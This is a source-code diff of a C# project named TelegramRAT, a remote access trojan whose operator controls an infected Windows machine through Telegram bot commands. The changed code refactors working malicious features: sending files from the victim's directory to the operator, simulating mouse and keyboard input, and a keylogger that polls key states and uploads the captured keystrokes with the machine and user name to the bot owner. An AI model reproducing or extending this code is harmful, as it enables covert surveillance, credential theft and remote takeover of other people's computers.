@@ -62,6 +62,13 @@ namespace TelegramRAT
             catch (Exception ex)
             {
                 Bot.SendTextMessageAsync(OwnerId, "Error occured! - " + ex.Message);
+
+                if (ex.InnerException.Message.Contains("Conflict: terminated by other getUpdates request; make sure that only one bot instance is running"))
+                {
+                    Bot.SendTextMessageAsync(OwnerId, "Only one bot instance could be online at the same time!");
+                    return;
+                }
+
                 Bot.SendTextMessageAsync(OwnerId, "Attempting to restart. Please wait...");
                 commands.Clear();
                 Main(args);
@@ -179,7 +186,7 @@ namespace TelegramRAT
 
         static void InitializeCommands(List<BotCommand> CommandsList)
         {
-            //HELP
+            //HELP Test::Pass
             CommandsList.Add(new BotCommand
             {
                 Command = "help",
@@ -187,7 +194,7 @@ namespace TelegramRAT
                 MayHaveNoArgs = true,
 
                 Description = "Show description of other commands.",
-                Example = "<code>/help screenshot</code>",
+                Example = "/help screenshot",
 
                 Execute = model =>
                 {
@@ -398,10 +405,14 @@ namespace TelegramRAT
                     {
                         try
                         {
+                            uint procId;
+                            if (!uint.TryParse(model.Args[0], out procId))
+                            {
+                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "The number must be a positive integer, representing id of process.", replyToMessageId: model.Message.MessageId);
+                                return;
+                            }
 
-                            int procId = int.Parse(model.Args[0]);
-
-                            Process proc = Process.GetProcessById(procId);
+                            Process proc = Process.GetProcessById((int)procId);
 
                             string procInfo =
                             $"Process: <b>{proc.ProcessName}</b>\n" +
@@ -607,23 +618,26 @@ namespace TelegramRAT
                 Example = "/download hello.txt",
                 Execute = model =>
                 {
-                    try
+                    Task.Run(() =>
                     {
-                        var filetodownload = model.RawArgs;
-                        if (!System.IO.File.Exists(Directory.GetCurrentDirectory() + "\\" + filetodownload))
+                        try
                         {
-                            Bot.SendTextMessageAsync(model.Message.Chat.Id, $"There is no file \"{filetodownload}\" at dir {Directory.GetCurrentDirectory()}");
-                            return;
+                            var filetodownload = model.RawArgs;
+                            if (!System.IO.File.Exists(Directory.GetCurrentDirectory() + "\\" + filetodownload))
+                            {
+                                Bot.SendTextMessageAsync(model.Message.Chat.Id, $"There is no file \"{filetodownload}\" at dir {Directory.GetCurrentDirectory()}");
+                                return;
+                            }
+                            var filetosend = new FileStream(Directory.GetCurrentDirectory() + "\\" + filetodownload, FileMode.Open, FileAccess.Read, FileShare.Read);
+                            {
+                                Bot.SendDocumentAsync(model.Message.Chat.Id, new InputOnlineFile(filetosend, filetosend.Name.Substring(filetosend.Name.LastIndexOf("\\"))), caption: filetodownload);
+                            }
                         }
-                        var filetosend = new FileStream(Directory.GetCurrentDirectory() + "\\" + filetodownload, FileMode.Open, FileAccess.Read, FileShare.Read);
+                        catch (Exception ex)
                         {
-                            Bot.SendDocumentAsync(model.Message.Chat.Id, new InputOnlineFile(filetosend, filetosend.Name.Substring(filetosend.Name.LastIndexOf("\\"))), caption: filetodownload);
+                            ReportError(model.Message, ex);
                         }
-                    }
-                    catch (Exception ex)
-                    {
-                        ReportError(model.Message, ex);
-                    }
+                    });
                 }
             });
 
@@ -845,14 +859,13 @@ namespace TelegramRAT
                 }
             });
 
-            //SEND KEYBOARD INPUT 
+            //INPUT 
             CommandsList.Add(new BotCommand
             {
-                Command = "sendinput",
+                Command = "input",
                 IgnoreCountArgs = true,
                 MayHaveNoArgs = false,
                 Description =
-                #region desc
                 "Simulate keyboard input with virtual keycode, expressed in hexadecimal\n\n" +
                 "List of virtual keycodes:\n" +
                 "LBUTTON = 1\nRBUTTON = 2\nCANCEL = 3\nMIDBUTTON = 4\nBACKSPACE = 8\n" +
@@ -863,8 +876,8 @@ namespace TelegramRAT
 
                 "<a href=\"https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\">See all keycodes</a>\n\n" +
                 "To send combination of keys, join them with plus: 11+43 (ctrl+c)\n",
-                #endregion
-                Example = "/sendinput 48 45 4c 4c 4f (hello)",
+
+                Example = "/input 48 45 4c 4c 4f (hello)",
                 Execute = model =>
                {
                    Task.Run(() =>
@@ -908,56 +921,56 @@ namespace TelegramRAT
                 Execute = model =>
                 {
                     Task.Run(() =>
-                  {
-                      try
-                      {
-                          if (model.Message.Type == MessageType.Photo)
-                          {
-                              using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
-                              {
-                                  Telegram.Bot.Types.File wallpaperPhoto = Bot.GetFileAsync(model.Message.Photo.Last().FileId).Result;
-                                  Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
-                              }
-                          }
-                          else if (model.Message.Type == MessageType.Document)
-                          {
-                              using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
-                              {
-                                  Telegram.Bot.Types.File wallpaperFile = Bot.GetFileAsync(model.Message.Document.FileId).Result;
-                                  Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
-                              }
-                          }
-                          else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Photo)
-                          {
-                              using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
-                              {
-                                  Telegram.Bot.Types.File wallpaperPhoto = Bot.GetFileAsync(model.Message.ReplyToMessage.Photo.Last().FileId).Result;
-                                  Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
-                              }
-                          }
-                          else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Document)
-                          {
-                              using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
-                              {
-                                  Telegram.Bot.Types.File wallpaperFile = Bot.GetFileAsync(model.Message.ReplyToMessage.Document.FileId).Result;
-                                  Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
-                              }
-                          }
-                          else
-                          {
-                              Bot.SendTextMessageAsync(model.Message.Chat.Id, "No file or photo pinned, use /help wallpaper to get info about this command!", replyToMessageId: model.Message.MessageId);
-                              return;
-                          }
+                    {
+                        try
+                        {
+                            if (model.Message.Type == MessageType.Photo)
+                            {
+                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
+                                {
+                                    Telegram.Bot.Types.File wallpaperPhoto = Bot.GetFileAsync(model.Message.Photo.Last().FileId).Result;
+                                    Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
+                                }
+                            }
+                            else if (model.Message.Type == MessageType.Document)
+                            {
+                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
+                                {
+                                    Telegram.Bot.Types.File wallpaperFile = Bot.GetFileAsync(model.Message.Document.FileId).Result;
+                                    Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
+                                }
+                            }
+                            else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Photo)
+                            {
+                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
+                                {
+                                    Telegram.Bot.Types.File wallpaperPhoto = Bot.GetFileAsync(model.Message.ReplyToMessage.Photo.Last().FileId).Result;
+                                    Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
+                                }
+                            }
+                            else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Document)
+                            {
+                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
+                                {
+                                    Telegram.Bot.Types.File wallpaperFile = Bot.GetFileAsync(model.Message.ReplyToMessage.Document.FileId).Result;
+                                    Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
+                                }
+                            }
+                            else
+                            {
+                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "No file or photo pinned, use /help wallpaper to get info about this command!", replyToMessageId: model.Message.MessageId);
+                                return;
+                            }
 
-                          WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, Directory.GetCurrentDirectory() + "\\wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
-                          System.IO.File.Delete("wllppr.png");
-                          Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
-                      }
-                      catch (Exception ex)
-                      {
-                          ReportError(model.Message, ex);
-                      }
-                  });
+                            WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, Directory.GetCurrentDirectory() + "\\wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
+                            System.IO.File.Delete("wllppr.png");
+                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
+                        }
+                        catch (Exception ex)
+                        {
+                            ReportError(model.Message, ex);
+                        }
+                    });
                 }
             });
 
@@ -1023,7 +1036,7 @@ namespace TelegramRAT
                                 windowCap.Position = 0;
 
                                 Bot.SendPhotoAsync(model.Message.Chat.Id, windowCap, info, replyToMessageId: model.Message.MessageId, parseMode: ParseMode.Html);
-                                
+
                                 return;
                             }
 
@@ -1096,26 +1109,155 @@ namespace TelegramRAT
                 }
             });
 
-            //MOVE MOUSE TO COORD
+            //MOUSE MEGA COMMAND
             CommandsList.Add(new BotCommand
             {
-                Command = "mouseto",
-                CountArgs = 2,
-                IgnoreCountArgs = false,
+                Command = "mouse",
+                IgnoreCountArgs = true,
                 MayHaveNoArgs = false,
 
-                Description = "Move cursor to coordinate in pixels",
-                Example = "/mouseto 200 300 (width heght)",
+                Description = 
+                "This command has multiple usage.\n" +
+                "to - move mouse cursor to point on the primary screen\n" +
+                "by - move mouse by pixels\n" +
+                "click - click mouse button\n" +
+                "dclick - double click mouse button\n" +
+                "down - mouse button down\n" +
+                "up - mouse button up\n" +
+                "scroll | vscroll - vertical scroll\n" +
+                "hscroll - horizontal scroll",
+
+                Example = "/mouse to 200 300",
 
                 Execute = model =>
                 {
                     MouseSimulator mouseSimulator = new MouseSimulator(new InputSimulator());
-
+                    
                     try
                     {
-                        mouseSimulator.MoveMouseTo(Convert.ToDouble(model.Args[0]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Width),
-                            Convert.ToDouble(model.Args[1]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Height));
-                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
+                        switch (model.Args[0].ToLower())
+                        {
+                            case "to":
+                                mouseSimulator.MoveMouseTo(Convert.ToDouble(model.Args[1]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Width),
+                                Convert.ToDouble(model.Args[2]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Height));
+                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
+                                break;
+
+                            case "by":
+                                mouseSimulator.MoveMouseBy(Convert.ToInt32(model.Args[1]),
+                                Convert.ToInt32(model.Args[2]));
+                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
+                                break;
+
+                            case "clk":
+                            case "clck":
+                            case "click":
+                                switch (model.Args[1])
+                                {
+                                    case "r":
+                                    case "right":
+                                        mouseSimulator.RightButtonClick();
+                                        break;
+                                    case "l":
+                                    case "left":
+                                        mouseSimulator.LeftButtonClick();
+                                        break;
+                                    default:
+                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type whether button you want to click(right or left).", replyToMessageId: model.Message.MessageId);
+                                        return;
+                                }
+                                break;
+
+                            case "dclk":
+                            case "dclck":
+                            case "dclick":
+                                switch (model.Args[1])
+                                {
+                                    case "r":
+                                    case "right":
+                                        mouseSimulator.RightButtonDoubleClick();
+                                        break;
+                                    case "l":
+                                    case "left":
+                                        mouseSimulator.LeftButtonDoubleClick();
+                                        break;
+                                    default:
+                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type whether button you want to double click(right or left).", replyToMessageId: model.Message.MessageId);
+                                        return;
+                                }
+                                break;
+
+                            case "dn":
+                            case "dwn":
+                            case "down":
+                                switch (model.Args[1])
+                                {
+                                    case "r":
+                                    case "right":
+                                        mouseSimulator.RightButtonDown();
+                                        break;
+                                    case "l":
+                                    case "left":
+                                        mouseSimulator.LeftButtonDown();
+                                        break;
+                                    default:
+                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type whether button you want to set down(right or left).", replyToMessageId: model.Message.MessageId);
+                                        return;
+                                }
+                                break;
+
+                            case "up":
+                                switch (model.Args[1])
+                                {
+                                    case "r":
+                                    case "right":
+                                        mouseSimulator.RightButtonUp();
+                                        break;
+                                    case "l":
+                                    case "left":
+                                        mouseSimulator.LeftButtonUp();
+                                        break;
+                                    default:
+                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type whether button you want to set up(right or left).", replyToMessageId: model.Message.MessageId);
+                                        return;
+                                }
+                                break;
+
+                            case "vscr":
+                            case "vscroll":
+                            case "scroll":
+                            case "scr":
+                                int vscrollSteps;
+                                if (int.TryParse(model.Args[1], out vscrollSteps))
+                                {
+                                    mouseSimulator.VerticalScroll(vscrollSteps * -1);
+                                }
+                                else
+                                {
+                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "The number must be an integer.", replyToMessageId: model.Message.MessageId);
+                                    return;
+                                }
+                                break;
+
+                            case "hscr":
+                            case "hscroll":
+                                int hscrollSteps;
+                                if (int.TryParse(model.Args[1], out hscrollSteps))
+                                {
+                                    mouseSimulator.HorizontalScroll(hscrollSteps * -1);
+                                }
+                                else
+                                {
+                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "The number must be an integer.", replyToMessageId: model.Message.MessageId);
+                                    return;
+                                }
+                                break;
+
+                            default:
+                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "No such use for this command.", replyToMessageId: model.Message.MessageId);
+                                return;
+                        }
+                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done", replyToMessageId: model.Message.MessageId);
 
                     }
                     catch (Exception ex)
@@ -1125,75 +1267,14 @@ namespace TelegramRAT
                 }
             });
 
-            //MOVE MOUSE BY PIXELS
+            //TEXT
             CommandsList.Add(new BotCommand
             {
-                Command = "mouseby",
-                CountArgs = 2,
-                IgnoreCountArgs = false,
-                MayHaveNoArgs = false,
-                Description = "Move cursor by pixels.",
-                Example = "/mouseby 15 20",
-                Execute = model =>
-                {
-                    MouseSimulator mouseSimulator = new MouseSimulator(new InputSimulator());
-                    try
-                    {
-                        mouseSimulator.MoveMouseBy(Convert.ToInt32(model.Args[0]),
-                            Convert.ToInt32(model.Args[1]));
-                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
-                    }
-                    catch (Exception ex)
-                    {
-                        ReportError(model.Message, ex);
-                    }
-                }
-            });
-
-            //CLICK LEFT MOUSE BUTTON
-            CommandsList.Add(new BotCommand
-            {
-                Command = "lmclick",
-                Description = "Simulate left mouse click.",
-                Execute = model =>
-                {
-                    new MouseSimulator(new InputSimulator()).LeftButtonClick();
-                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
-                }
-            });
-
-            //DOUBLECLICK LEFT MOUSE BUTTON
-            CommandsList.Add(new BotCommand
-            {
-                Command = "dlmclick",
-                Description = "Simulate double left mouse click.",
-                Execute = model =>
-                {
-                    new MouseSimulator(new InputSimulator()).LeftButtonDoubleClick();
-                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
-                }
-            });
-
-            //CLICK RIGHT MOUSE BUTTON
-            CommandsList.Add(new BotCommand
-            {
-                Command = "rmclick",
-                Description = "Simulate right mouse click.",
-                Execute = model =>
-                {
-                    new MouseSimulator(new InputSimulator()).RightButtonClick();
-                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
-                }
-            });
-
-            //SEND TEXT INPUT
-            CommandsList.Add(new BotCommand
-            {
-                Command = "sendtext",
+                Command = "text",
                 IgnoreCountArgs = true,
                 MayHaveNoArgs = false,
                 Description = "Send text input",
-                Example = "/sendtext hello world",
+                Example = "/text hello world",
                 Execute = model =>
                 {
                     Task.Run(() =>
@@ -1221,73 +1302,80 @@ namespace TelegramRAT
                 {
                     Task.Run(() =>
                     {
-                        if (keylog)
+                        try
                         {
-                            keylog = false;
-                            return;
-                        }
-                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Keylog started!", replyToMessageId: model.Message.MessageId);
-                        keylog = true;
-
-                        StringBuilder mappedKeys = new StringBuilder();
-                        StringBuilder unmappedKeys = new StringBuilder();
-                        List<uint> LastKeys = new List<uint>();
-                        List<uint> shit = new List<uint>();
-                        while (keylog)
-                        {
-                            shit.Clear();
-                            bool hasAtLeastOneKey = false;
-                            for (uint i = 0; i < 256; i++)
+                            if (keylog)
                             {
-                                int state = WinAPI.GetAsyncKeyState(i);
-                                if (state != 0)
-                                {
-                                    shit.Add(i);
-                                    hasAtLeastOneKey = true;
-                                }
+                                keylog = false;
+                                return;
                             }
-                            if (!hasAtLeastOneKey && LastKeys.Count > 0)
+                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Keylog started!", replyToMessageId: model.Message.MessageId);
+                            keylog = true;
+
+                            StringBuilder mappedKeys = new StringBuilder();
+                            StringBuilder unmappedKeys = new StringBuilder();
+                            List<uint> LastKeys = new List<uint>();
+                            List<uint> shit = new List<uint>();
+                            while (keylog)
                             {
-                                char mappedKeycode = WinAPI.MapVirtualKey(LastKeys[0]);
-                                for (int i = 0; i < LastKeys.Count; i++)
+                                shit.Clear();
+                                bool hasAtLeastOneKey = false;
+                                for (uint i = 0; i < 256; i++)
                                 {
-                                    mappedKeycode = WinAPI.MapVirtualKey(LastKeys[i]);
-                                    if ((int)mappedKeycode == 0)
-                                        mappedKeys.Append(LastKeys[i].ToString() + ";");
-                                    else
-                                        mappedKeys.Append(mappedKeycode + ";");
-
-                                    unmappedKeys.Append(LastKeys[i].ToString("X") + ";");
+                                    int state = WinAPI.GetAsyncKeyState(i);
+                                    if (state != 0)
+                                    {
+                                        shit.Add(i);
+                                        hasAtLeastOneKey = true;
+                                    }
                                 }
-                                mappedKeys.Append(" ");
-                                unmappedKeys.Append(" ");
-                                LastKeys.Clear();
-                                continue;
+                                if (!hasAtLeastOneKey && LastKeys.Count > 0)
+                                {
+                                    char mappedKeycode = WinAPI.MapVirtualKey(LastKeys[0]);
+                                    for (int i = 0; i < LastKeys.Count; i++)
+                                    {
+                                        mappedKeycode = WinAPI.MapVirtualKey(LastKeys[i]);
+                                        if ((int)mappedKeycode == 0)
+                                            mappedKeys.Append(LastKeys[i].ToString() + ";");
+                                        else
+                                            mappedKeys.Append(mappedKeycode + ";");
+
+                                        unmappedKeys.Append(LastKeys[i].ToString("X") + ";");
+                                    }
+                                    mappedKeys.Append(" ");
+                                    unmappedKeys.Append(" ");
+                                    LastKeys.Clear();
+                                    continue;
+                                }
+                                foreach (uint v in shit)
+                                {
+                                    if (!LastKeys.Contains(v))
+                                    {
+                                        LastKeys.Add(v);
+                                    }
+                                }
+
                             }
-                            foreach (uint v in shit)
+                            using (FileStream keylogFileStream = System.IO.File.Create("keylog.txt"))
                             {
-                                if (!LastKeys.Contains(v))
-                                {
-                                    LastKeys.Add(v);
-                                }
+                                StreamWriter streamWriter = new StreamWriter(keylogFileStream);
+                                streamWriter.WriteLine("#Mapped keylog:");
+                                streamWriter.WriteLine(mappedKeys.ToString());
+                                streamWriter.WriteLine("\n#Remember, mapped keylog is not the \"clear\" input.\n\n#Unmapped keylog:");
+                                streamWriter.WriteLine(unmappedKeys.ToString());
+                                streamWriter.WriteLine("\n#Keycodes table - https://docs.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes");
+                                streamWriter.Close();
                             }
+                            Bot.SendTextMessageAsync(model.Message.From.Id, "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + mappedKeys.ToString());
 
+                            using (FileStream fs = new FileStream("keylog.txt", FileMode.Open))
+                            {
+                                Bot.SendDocumentAsync(model.Message.From.Id, new InputOnlineFile(fs), caption: "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName).Wait();
+                            }
                         }
-                        using (FileStream keylogFileStream = System.IO.File.Create("keylog.txt"))
+                        catch (Exception ex)
                         {
-                            StreamWriter streamWriter = new StreamWriter(keylogFileStream);
-                            streamWriter.WriteLine("#Mapped keylog:");
-                            streamWriter.WriteLine(mappedKeys.ToString());
-                            streamWriter.WriteLine("\n#Remember, mapped keylog is not the \"clear\" input.\n\n#Unmapped keylog:");
-                            streamWriter.WriteLine(unmappedKeys.ToString());
-                            streamWriter.WriteLine("\n#Keycodes table - https://docs.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes");
-                            streamWriter.Close();
-                        }
-                        Bot.SendTextMessageAsync(model.Message.From.Id, "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + mappedKeys.ToString());
-
-                        using (FileStream fs = new FileStream("keylog.txt", FileMode.Open))
-                        {
-                            Bot.SendDocumentAsync(model.Message.From.Id, new InputOnlineFile(fs), caption: "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName).Wait();
+                            ReportError(model.Message, ex);
                         }
                     });
                 }
@@ -1758,7 +1846,12 @@ namespace TelegramRAT
                 {
                     Task.Run(() =>
                     {
-                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Ping!", replyToMessageId: model.Message.MessageId); ;
+                        var pingmessage = Bot.SendTextMessageAsync(model.Message.Chat.Id, "Ping!", replyToMessageId: model.Message.MessageId).Result;
+
+                        string elapsedTime = (pingmessage.Date - model.Message.Date).TotalMilliseconds.ToString();
+
+                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Elapsed time: " + elapsedTime, replyToMessageId: model.Message.MessageId);
+
                     });
                 }
             });
@@ -1809,13 +1902,11 @@ namespace TelegramRAT
                     $"OS: {GetWindowsVersion()}({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})\n" +
                     $"NT version: {Environment.OSVersion.Version}\n" +
                     $"Process: {(Environment.Is64BitProcess ? "64-bit" : "32-bit")}\n";
-                    
+
 
                     Bot.SendTextMessageAsync(model.Message.Chat.Id, sysInfo, replyToMessageId: model.Message.MessageId);
                 }
             });
-
-            
 
         }
 
